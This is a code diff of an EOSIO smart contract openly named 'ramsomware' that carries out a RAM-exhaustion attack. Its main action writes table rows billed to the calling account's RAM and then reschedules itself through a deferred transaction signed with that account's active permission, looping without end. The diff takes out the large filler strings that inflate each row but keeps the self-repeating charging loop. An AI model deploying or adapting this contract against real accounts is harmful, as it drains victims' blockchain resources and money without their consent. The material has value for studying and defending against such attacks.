@@ -39,16 +39,6 @@ class [[eosio::contract]] ramsomware: public contract{
     private:
         struct [[eosio::table]] person {
             uint64_t key;
-            string s0;
-            string s1;
-            string s2;
-            string s3;
-            string s4;
-            string s5;
-            string s6;
-            string s7;
-            string s8;
-            string s9;
             uint64_t primary_key() const { return key; }
         };
         typedef eosio::multi_index<"people"_n, person> address_index;
@@ -57,44 +47,24 @@ class [[eosio::contract]] ramsomware: public contract{
         [[eosio::action]]
         void main( name client, uint64_t idx, uint64_t randNum)
         {
-        print("[*] Parent Called\n");
+            print("[*] Parent Called\n");
 
-        address_index addresses(_code, _code.value);
-        auto iterator = addresses.find(idx);
-        if( iterator == addresses.end() )
-        {
-            addresses.emplace(client, [&]( auto& row ) 
+            address_index addresses(_code, _code.value);
+            auto iterator = addresses.find(idx);
+            if( iterator == addresses.end() )
             {
-                row.key = idx;
-                string A = "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDEEEEEEEEEEA";
-                A = A+A+A+A+A+A+A+A+A+A+A+A+A;
-                A = A+A;
-                A = A+A;
-                A = A+ A+A +A +A;
-                A = A+ A;
-                A = A+ A;
-                A = A+ A;
-                A = A+ A;
-                A = A+ A;
-                row.s0 = A;
-                row.s1 = A;
-                row.s2 = A;
-                row.s3 = A;
-                row.s4 = A;
-                row.s5 = A;
-                row.s6 = A;
-                row.s7 = A;
-                row.s8 = A;
-                row.s9 = A;
-            });
-            printf("SUCCESS SAVE\n");
-        }
-        transaction out1{};
-        out1.actions.emplace_back(permission_level{client, "active"_n}, _self , "main"_n, std::make_tuple(client, uint64_t(idx+1), uint64_t(randNum)));
-	    out1.send(idx+1, "loop"_n, false);
-        print("[#] loop  : %d \n ", idx);
+                addresses.emplace(client, [&]( auto& row ) 
+                {
+                    row.key = idx;
+                });
+                printf("SUCCESS SAVE\n");
+            }
+            transaction out1{};
+            out1.actions.emplace_back(permission_level{client, "active"_n}, _self , "main"_n, std::make_tuple(client, uint64_t(idx+1), uint64_t(randNum)));
+	        out1.send(idx+1, "loop"_n, false);
+            print("[#] loop  : %d \n ", idx);
 
-    }
+        }
 
 };
 EOSIO_DISPATCH(ramsomware ,(main))
